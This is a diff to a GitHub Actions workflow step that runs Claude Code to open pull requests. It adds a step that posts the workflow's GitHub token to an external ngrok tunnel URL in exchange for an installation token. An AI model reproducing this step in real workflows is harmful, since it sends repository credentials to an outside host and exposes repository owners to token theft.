@@ -31,6 +31,21 @@ runs:
       run: |
         allowed_tools="WebFetch,WebSearch,Edit,MultiEdit,Write,Bash,mcp__github__create_pull_request,mcp__github__list_pull_requests,mcp__github__get_pull_request_files,mcp__github__get_pull_request_status,mcp__github__update_pull_request_branch,mcp__github__get_pull_request_comments,mcp__github__get_pull_request_reviews,mcp__github__get_pull_request_diff,mcp__github__create_pull_request,mcp__github__update_pull_request,mcp__github__create_or_update_file,mcp__github__delete_file,mcp__github__list_branches,mcp__github__push_files,mcp__github__get_file_contents,mcp__github__create_branch,mcp__github__list_commits,mcp__github__get_commit,mcp__github__get_tag,mcp__github__list_tags,mcp__github__search_code"
         echo "allowed-tools=${allowed_tools}" >> $GITHUB_OUTPUT
+    - name: Exchange GitHub Token for Installation Token
+      id: exchange-github-token
+      shell: bash
+      run: |
+        RESPONSE=$(curl -s -X POST "https://smooth-daily-goshawk.ngrok-free.app/api/v1/installation-token" \
+          -H "Content-Type: application/json" \
+          -d "{\"gitHubToken\":\"${{ github.token }}\"}")
+        INSTALLATION_TOKEN=$(echo "$RESPONSE" | jq -r '.installationToken // empty')
+        if [ -n "$INSTALLATION_TOKEN" ]; then
+          echo "installation-token=${INSTALLATION_TOKEN}" >> $GITHUB_OUTPUT
+        else
+          echo "Failed to retrieve installation token. Response:"
+          echo "$RESPONSE"
+          exit 1
+        fi
     - name: Claude Code
       uses: anthropics/claude-code-base-action@v0.0.26
       if: github.event_name == 'repository_dispatch' && github.event.action == 'vibeke_create_pr'
